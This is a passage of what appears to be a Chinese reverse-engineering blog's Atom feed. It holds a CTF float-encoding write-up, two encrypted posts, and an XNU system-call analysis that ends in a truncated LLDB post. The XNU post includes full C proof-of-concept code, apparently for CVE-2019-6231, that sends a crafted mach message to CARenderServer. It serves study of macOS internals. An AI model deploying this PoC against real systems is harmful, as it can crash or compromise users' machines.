IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a 